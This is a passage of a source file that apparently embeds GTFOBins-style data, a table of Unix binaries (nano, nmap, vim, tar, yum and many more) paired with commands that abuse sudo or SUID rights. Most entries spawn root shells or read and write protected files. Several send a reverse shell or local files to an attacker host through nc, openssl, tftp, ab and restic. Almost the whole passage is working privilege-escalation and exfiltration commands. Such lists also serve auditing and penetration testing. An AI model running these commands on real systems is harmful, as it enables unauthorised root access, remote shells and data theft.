            "code": "sudo multitime /bin/sh"
        }
    ],
    "mv": [
        {
            "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n"
        }
    ],
    "mysql": [
        {
            "code": "sudo mysql -e '\\! /bin/sh'"
        }
    ],
    "nano": [
        {
            "code": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n"
        }
    ],
    "nasm": [
        {
            "code": "LFILE=file_to_read\nsudo nasm -@ $LFILE\n"
        }
    ],
    "nawk": [
        {
            "code": "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
        }
    ],
    "nc": [
        {
            "code": "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n",
            "description": "Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional."
        }
    ],
    "ncdu": [
        {
            "code": "sudo ncdu\nb\n"
        }
    ],
    "ncftp": [
        {
            "code": "sudo ncftp\n!/bin/sh\n"
        }
    ],
    "neofetch": [
        {
            "code": "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF\n"
        }
    ],
    "nft": [
        {
            "code": "LFILE=file_to_read\nsudo nft -f \"$LFILE\"\n"
        }
    ],
    "nice": [
        {
            "code": "sudo nice /bin/sh"
        }
    ],
    "nl": [
        {
            "code": "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n"
        }
    ],
    "nm": [
        {
            "code": "LFILE=file_to_read\nsudo nm @$LFILE\n"
        }
    ],
    "nmap": [
        {
            "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n",
            "description": "Input echo is disabled."
        },
        {
            "code": "sudo nmap --interactive\nnmap> !sh\n",
            "description": "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands."
        }
    ],
    "node": [
        {
            "code": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
        }
    ],
    "nohup": [
        {
            "code": "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
        }
    ],
    "npm": [
        {
            "code": "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i\n",
            "description": "Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`."
        }
    ],
    "nroff": [
        {
            "code": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n"
        }
    ],
    "nsenter": [
        {
            "code": "sudo nsenter /bin/sh"
        }
    ],
    "ntpdate": [
        {
            "code": "LFILE=file_to_read\nsudo ntpdate -a x -k $LFILE -d localhost\n"
        }
    ],
    "octave": [
        {
            "code": "sudo octave-cli --eval 'system(\"/bin/sh\")'"
        }
    ],
    "od": [
        {
            "code": "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n"
        }
    ],
    "openssl": [
        {
            "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
            "description": "To receive the shell run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\n"
        }
    ],
    "openvpn": [
        {
            "code": "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n"
        },
        {
            "code": "LFILE=file_to_read\nsudo openvpn --config \"$LFILE\"\n",
            "description": "The file is actually parsed and the first partial wrong line is returned in an error message."
        }
    ],
    "openvt": [
        {
            "code": "COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF\n",
            "description": "The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file."
        }
    ],
    "opkg": [
        {
            "code": "sudo opkg install x_1.0_all.deb\n",
            "description": "It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n```\n"
        }
    ],
    "pandoc": [
        {
            "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\nsudo pandoc -L $TF /dev/null\n",
            "description": "Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
        }
    ],
    "paste": [
        {
            "code": "LFILE=file_to_read\nsudo paste $LFILE\n"
        }
    ],
    "pdb": [
        {
            "code": "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n"
        }
    ],
    "pdflatex": [
        {
            "code": "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n",
            "description": "The read file will be part of the output."
        },
        {
            "code": "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
        }
    ],
    "pdftex": [
        {
            "code": "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"
        }
    ],
    "perf": [
        {
            "code": "sudo perf stat /bin/sh\n"
        }
    ],
    "perl": [
        {
            "code": "sudo perl -e 'exec \"/bin/sh\";'"
        }
    ],
    "perlbug": [
        {
            "code": "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"
        }
    ],
    "pexec": [
        {
            "code": "sudo pexec /bin/sh"
        }
    ],
    "pg": [
        {
            "code": "sudo pg /etc/profile\n!/bin/sh\n"
        }
    ],
    "php": [
        {
            "code": "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"
        }
    ],
    "pic": [
        {
            "code": "sudo pic -U\n.PS\nsh X sh X\n"
        }
    ],
    "pico": [
        {
            "code": "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n"
        }
    ],
    "pidstat": [
        {
            "code": "COMMAND=id\nsudo pidstat -e $COMMAND\n"
        }
    ],
    "pip": [
        {
            "code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n"
        }
    ],
    "pkexec": [
        {
            "code": "sudo pkexec /bin/sh"
        }
    ],
    "pkg": [
        {
            "code": "sudo pkg install -y --no-repo-update ./x-1.0.txz\n",
            "description": "It runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF\n```\n"
        }
    ],
    "posh": [
        {
            "code": "sudo posh"
        }
    ],
    "pr": [
        {
            "code": "LFILE=file_to_read\npr -T $LFILE\n"
        }
    ],
    "pry": [
        {
            "code": "sudo pry\nsystem(\"/bin/sh\")\n"
        }
    ],
    "psftp": [
        {
            "code": "sudo psftp\n!/bin/sh\n"
        }
    ],
    "psql": [
        {
            "code": "psql\n\\?\n!/bin/sh\n"
        }
    ],
    "ptx": [
        {
            "code": "LFILE=file_to_read\nsudo ptx -w 5000 \"$LFILE\"\n"
        }
    ],
    "puppet": [
        {
            "code": "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"
        }
    ],
    "pwsh": [
        {
            "code": "sudo pwsh"
        }
    ],
    "python": [
        {
            "code": "sudo python -c 'import os; os.system(\"/bin/sh\")'"
        }
    ],
    "rake": [
        {
            "code": "sudo rake -p '`/bin/sh 1>&0`'"
        }
    ],
    "rc": [
        {
            "code": "sudo rc -c '/bin/sh'"
        }
    ],
    "readelf": [
        {
            "code": "LFILE=file_to_read\nsudo readelf -a @$LFILE\n"
        }
    ],
    "red": [
        {
            "code": "sudo red file_to_write\na\nDATA\n.\nw\nq\n"
        }
    ],
    "redcarpet": [
        {
            "code": "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n"
        }
    ],
    "restic": [
        {
            "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
        }
    ],
    "rev": [
        {
            "code": "LFILE=file_to_read\nsudo rev $LFILE | rev\n"
        }
    ],
    "rlwrap": [
        {
            "code": "sudo rlwrap /bin/sh"
        }
    ],
    "rpm": [
        {
            "code": "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
        },
        {
            "code": "sudo rpm -ivh x-1.0-1.noarch.rpm\n",
            "description": "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n"
        }
    ],
    "rpmdb": [
        {
            "code": "sudo rpmdb --eval '%(/bin/sh 1>&2)'"
        }
    ],
    "rpmquery": [
        {
            "code": "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
        }
    ],
    "rpmverify": [
        {
            "code": "sudo rpmverify --eval '%(/bin/sh 1>&2)'"
        }
    ],
    "rsync": [
        {
            "code": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
        }
    ],
    "ruby": [
        {
            "code": "sudo ruby -e 'exec \"/bin/sh\"'"
        }
    ],
    "run-mailcap": [
        {
            "code": "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n",
            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
        }
    ],
    "run-parts": [
        {
            "code": "sudo run-parts --new-session --regex '^sh$' /bin"
        }
    ],
    "runscript": [
        {
            "code": "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nsudo runscript $TF\n"
        }
    ],
    "rview": [
        {
            "code": "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
            "description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3."
        },
        {
            "code": "sudo rview -c ':lua os.execute(\"reset; exec sh\")'",
            "description": "This requires that `rview` is compiled with Lua support."
        }
    ],
    "rvim": [
        {
            "code": "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
            "description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3."
        },
        {
            "code": "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'",
            "description": "This requires that `rvim` is compiled with Lua support."
        }
    ],
    "sash": [
        {
            "code": "sudo sash"
        }
    ],
    "scanmem": [
        {
            "code": "sudo scanmem\nshell /bin/sh\n"
        }
    ],
    "scp": [
        {
            "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"
        }
    ],
    "screen": [
        {
            "code": "sudo screen"
        }
    ],
    "script": [
        {
            "code": "sudo script -q /dev/null"
        }
    ],
    "scrot": [
        {
            "code": "sudo scrot -e /bin/sh"
        }
    ],
    "sed": [
        {
            "code": "sudo sed -n '1e exec sh 1>&0' /etc/hosts",
            "description": "GNU version only. Also, this requires `bash`."
        }
    ],
    "service": [
        {
            "code": "sudo service ../../bin/sh"
        }
    ],
    "setarch": [
        {
            "code": "sudo setarch $(arch) /bin/sh"
        }
    ],
    "setfacl": [
        {
            "code": "LFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE\n"
        }
    ],
    "setlock": [
        {
            "code": "sudo setlock - /bin/sh"
        }
    ],
    "sftp": [
        {
            "code": "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n"
        }
    ],
    "sg": [
        {
            "code": "sudo sg root\n"
        }
    ],
    "shuf": [
        {
            "code": "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n",
            "description": "The written file content is corrupted by adding a newline."
        }
    ],
    "slsh": [
        {
            "code": "sudo slsh -e 'system(\"/bin/sh\")'"
        }
    ],
    "smbclient": [
        {
            "code": "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n"
        }
    ],
    "snap": [
        {
            "code": "sudo snap install xxxx_1.0_all.snap --dangerous --devmode\n",
            "description": "It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nCOMMAND=id\ncd $(mktemp -d)\nmkdir -p meta/hooks\nprintf '#!/bin/sh\\n%s; false' \"$COMMAND\" >meta/hooks/install\nchmod +x meta/hooks/install\nfpm -n xxxx -s dir -t snap -a all meta\n```\n"
        }
    ],
    "socat": [
        {
            "code": "sudo socat stdin exec:/bin/sh\n",
            "description": "The resulting shell is not a proper TTY shell and lacks the prompt."
        }
    ],
    "soelim": [
        {
            "code": "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n"
        }
    ],
    "softlimit": [
        {
            "code": "sudo softlimit /bin/sh"
        }
    ],
    "sort": [
        {
            "code": "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n"
        }
    ],
    "split": [
        {
            "code": "sudo split --filter=/bin/sh /dev/stdin\n",
            "description": "The shell prompt is not printed."
        }
    ],
    "sqlite3": [
        {
            "code": "sudo sqlite3 /dev/null '.shell /bin/sh'"
        }
    ],
    "sqlmap": [
        {
            "code": "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""
        }
    ],
    "ss": [
        {
            "code": "LFILE=file_to_read\nsudo ss -a -F $LFILE\n"
        }
    ],
    "ssh": [
        {
            "code": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
            "description": "Spawn interactive root shell through ProxyCommand option."
        }
    ],
    "ssh-agent": [
        {
            "code": "sudo ssh-agent /bin/"
        }
    ],
    "ssh-keygen": [
        {
            "code": "sudo ssh-keygen -D ./lib.so",
            "description": ""
        }
    ],
    "ssh-keyscan": [
        {
            "code": "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n"
        }
    ],
    "sshpass": [
        {
            "code": "sudo sshpass /bin/sh"
        }
    ],
    "start-stop-daemon": [
        {
            "code": "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
        }
    ],
    "stdbuf": [
        {
            "code": "sudo stdbuf -i0 /bin/sh"
        }
    ],
    "strace": [
        {
            "code": "sudo strace -o /dev/null /bin/sh"
        }
    ],
    "strings": [
        {
            "code": "LFILE=file_to_read\nsudo strings \"$LFILE\"\n"
        }
    ],
    "su": [
        {
            "code": "sudo su"
        }
    ],
    "sudo": [
        {
            "code": "sudo sudo /bin/sh"
        }
    ],
    "sysctl": [
        {
            "code": "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
        }
    ],
    "systemctl": [
        {
            "code": "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n"
        },
        {
            "code": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n"
        },
        {
            "code": "sudo systemctl\n!sh\n",
            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
        }
    ],
    "systemd-resolve": [
        {
            "code": "sudo systemd-resolve --status\n!sh\n",
            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
        }
    ],
    "tac": [
        {
            "code": "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n"
        }
    ],
    "tail": [
        {
            "code": "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n"
        }
    ],
    "tar": [
        {
            "code": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
        }
    ],
    "task": [
        {
            "code": "sudo task execute /bin/sh"
        }
    ],
    "taskset": [
        {
            "code": "sudo taskset 1 /bin/sh"
        }
    ],
    "tasksh": [
        {
            "code": "sudo tasksh\n!/bin/sh\n"
        }
    ],
    "tbl": [
        {
            "code": "LFILE=file_to_read\nsudo tbl $LFILE\n"
        }
    ],
    "tclsh": [
        {
            "code": "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
        }
    ],
    "tcpdump": [
        {
            "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"
        }
    ],
    "tdbtool": [
        {
            "code": "sudo tdbtool\n! /bin/sh\n"
        }
    ],
    "tee": [
        {
            "code": "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n"
        }
    ],
    "telnet": [
        {
            "code": "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n",
            "description": "BSD version only. Needs to be connected first."
        }
    ],
    "terraform": [
        {
            "code": "sudo terraform console\nfile(\"file_to_read\")\n"
        }
    ],
    "tex": [
        {
            "code": "sudo tex --shell-escape '\\write18{/bin/sh}\\end'\n"
        }
    ],
    "tftp": [
        {
            "code": "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n",
            "description": "Send local file to a TFTP server."
        }
    ],
    "tic": [
        {
            "code": "LFILE=file_to_read\nsudo tic -C \"$LFILE\"\n"
        }
    ],
    "time": [
        {
            "code": "sudo /usr/bin/time /bin/sh"
        }
    ],
    "timedatectl": [
        {
            "code": "sudo timedatectl list-timezones\n!/bin/sh\n"
        }
    ],
    "timeout": [
        {
            "code": "sudo timeout --foreground 7d /bin/sh"
        }
    ],
    "tmate": [
        {
            "code": "sudo tmate -c /bin/sh"
        }
    ],
    "tmux": [
        {
            "code": "sudo tmux"
        }
    ],
    "top": [
        {
            "code": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n",
            "description": "This requires that the root configuration file is writable and might be used to persist elevated privileges."
        }
    ],
    "torify": [
        {
            "code": "sudo torify /bin/sh"
        }
    ],
    "torsocks": [
        {
            "code": "sudo torsocks /bin/sh"
        }
    ],
    "troff": [
        {
            "code": "LFILE=file_to_read\nsudo troff $LFILE\n"
        }
    ],
    "ul": [
        {
            "code": "LFILE=file_to_read\nsudo ul \"$LFILE\"\n"
        }
    ],
    "unexpand": [
        {
            "code": "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n"
        }
    ],
    "uniq": [
        {
            "code": "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n"
        }
    ],
    "unshare": [
        {
            "code": "sudo unshare /bin/sh"
        }
    ],
    "unsquashfs": [
        {
            "code": "sudo unsquashfs shell\n./squashfs-root/sh -p\n"
        }
    ],
    "unzip": [
        {
            "code": "sudo unzip -K shell.zip\n./sh -p\n"
        }
    ],
    "update-alternatives": [
        {
            "code": "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n",
            "description": "Write in `$LFILE` a symlink to `$TF`."
        }
    ],
    "uudecode": [
        {
            "code": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
        }
    ],
    "uuencode": [
        {
            "code": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
        }
    ],
    "vagrant": [
        {
            "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n"
        }
    ],
    "valgrind": [
        {
            "code": "sudo valgrind /bin/sh"
        }
    ],
    "varnishncsa": [
        {
            "code": "LFILE=file_to_write\nsudo varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\"\n"
        }
    ],
    "vi": [
        {
            "code": "sudo vi -c ':!/bin/sh' /dev/null"
        }
    ],
    "view": [
        {
            "code": "sudo view -c ':!/bin/sh'"
        },
        {
            "code": "sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
            "description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3."
        },
        {
            "code": "sudo view -c ':lua os.execute(\"reset; exec sh\")'",
            "description": "This requires that `view` is compiled with Lua support."
        }
    ],
    "vigr": [
        {
            "code": "sudo vigr"
        }
    ],
    "vim": [
        {
            "code": "sudo vim -c ':!/bin/sh'"
        },
        {
            "code": "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
            "description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3."
        },
        {
            "code": "sudo vim -c ':lua os.execute(\"reset; exec sh\")'",
            "description": "This requires that `vim` is compiled with Lua support."
        }
    ],
    "vimdiff": [
        {
            "code": "sudo vimdiff -c ':!/bin/sh'"
        },
        {
            "code": "sudo vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
            "description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3."
        },
        {
            "code": "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'",
            "description": "This requires that `vimdiff` is compiled with Lua support."
        }
    ],
    "vipw": [
        {
            "code": "sudo vipw"
        }
    ],
    "virsh": [
        {
            "code": "SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x\n"
        }
    ],
    "w3m": [
        {
            "code": "LFILE=file_to_read\nsudo w3m \"$LFILE\" -dump\n"
        }
    ],
    "wall": [
        {
            "code": "LFILE=file_to_read\nsudo wall --nobanner \"$LFILE\"\n"
        }
    ],
    "watch": [
        {
            "code": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
        }
    ],
    "wc": [
        {
            "code": "LFILE=file_to_read\nsudo wc --files0-from \"$LFILE\"\n"
        }
    ],
    "wget": [
        {
            "code": "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nsudo wget --use-askpass=$TF 0\n"
        }
    ],
    "whiptail": [
        {
            "code": "LFILE=file_to_read\nsudo whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
        }
    ],
    "wireshark": [
        {
            "code": "PORT=4444\nsudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" &\necho 'DATA' | nc -u 127.127.127.127 \"$PORT\"\n",
            "description": "This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.\n\nAfter starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:\n\n1. select the only received packet;\n\n2. right-click on \"Data\" from the \"Packet Details\" pane, and select \"Export Packet Bytes...\";\n\n3. choose where to save the packet dump.\n"
        }
    ],
    "wish": [
        {
            "code": "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
        }
    ],
    "xargs": [
        {
            "code": "sudo xargs -a /dev/null sh",
            "description": "GNU version only."
        }
    ],
    "xdg-user-dir": [
        {
            "code": "sudo xdg-user-dir '}; /bin/sh #'\n"
        }
    ],
    "xdotool": [
        {
            "code": "sudo xdotool exec --sync /bin/sh"
        }
    ],
    "xelatex": [
        {
            "code": "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
            "description": "The read file will be part of the output."
        },
        {
            "code": "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
        }
    ],
    "xetex": [
        {
            "code": "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'\n"
        }
    ],
    "xmodmap": [
        {
            "code": "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n"
        }
    ],
    "xmore": [
        {
            "code": "LFILE=file_to_read\nsudo xmore $LFILE\n"
        }
    ],
    "xpad": [
        {
            "code": "LFILE=file_to_read\nsudo xpad -f \"$LFILE\"\n"
        }
    ],
    "xxd": [
        {
            "code": "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n"
        }
    ],
    "xz": [
        {
            "code": "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d\n"
        }
    ],
    "yarn": [
        {
            "code": "sudo yarn exec /bin/sh"
        }
    ],
    "yash": [
        {
            "code": "sudo yash"
        }
    ],
    "yum": [
        {
            "code": "sudo yum localinstall -y x-1.0-1.noarch.rpm\n",
            "description": "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n"
        },
        {
            "code": "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n",
            "description": "Spawn interactive root shell by loading a custom plugin.\n"
        }
    ],
    "zathura": [
        {
            "code": "sudo zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n"
        }
    ],
    "zip": [
        {
            "code": "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"
        }
    ],
    "zsh": [
        {
            "code": "sudo zsh"
        }
    ],
    "zsoelim": [
        {
            "code": "LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n"
        }
    ],
    "zypper": [
        {
            "code": "sudo zypper x\n",
            "description": "This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges."
        },
        {
            "code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n"
        }
    ]
}
# SUDO_BINS_END

# SUID_BINS_START
suid_bins = {
    "aa-exec": [
        {
            "code": "./aa-exec /bin/sh -p"
        }
    ],
    "ab": [
        {
            "code": "URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n",
            "description": "Upload local file via HTTP POST request."
        }
    ],
    "agetty": [
        {
            "code": "./agetty -o -p -l /bin/sh -a root tty"
        }
    ],
    "alpine": [
        {
            "code": "LFILE=file_to_read\n./alpine -F \"$LFILE\"\n"
        }
    ],
    "ar": [
        {
            "code": "TF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
        }
    ],
    "arj": [
        {
            "code": "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR\n",
            "description": "The archive can also be prepared offline then uploaded."
        }
    ],
    "arp": [
        {
            "code": "LFILE=file_to_read\n./arp -v -f \"$LFILE\"\n"
        }
    ],
    "as": [
        {
            "code": "LFILE=file_to_read\n./as @$LFILE\n"
        }
    ],
    "ascii-xfr": [
        {
            "code": "LFILE=file_to_read\n./ascii-xfr -ns \"$LFILE\"\n"
        }
    ],
    "ash": [
        {
            "code": "./ash"
        }
    ],
    "aspell": [
        {
            "code": "LFILE=file_to_read\n./aspell -c \"$LFILE\"\n"
        }
    ],
    "atobm": [
        {
            "code": "LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
        }
    ],
    "awk": [
        {
            "code": "LFILE=file_to_read\n./awk '//' \"$LFILE\"\n"
        }
    ],
    "base32": [
        {
            "code": "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"
        }
    ],
    "base64": [
        {
            "code": "LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n"
        }
    ],
    "basenc": [
        {
            "code": "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n"
        }
    ],
    "basez": [
        {
            "code": "LFILE=file_to_read\n./basez \"$LFILE\" | basez --decode\n"
        }
    ],
    "bash": [
        {
            "code": "./bash -p"
        }
    ],
    "bc": [
        {
            "code": "LFILE=file_to_read\n./bc -s $LFILE\nquit\n"
        }
    ],
    "bridge": [
        {
            "code": "LFILE=file_to_read\n./bridge -b \"$LFILE\"\n"
        }
    ],
    "busctl": [
        {
            "code": "./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'\n"
        }
    ],
    "busybox": [
        {
            "code": "./busybox sh",
            "description": "It may drop the SUID privileges depending on the compilation flags and the runtime configuration."
        }
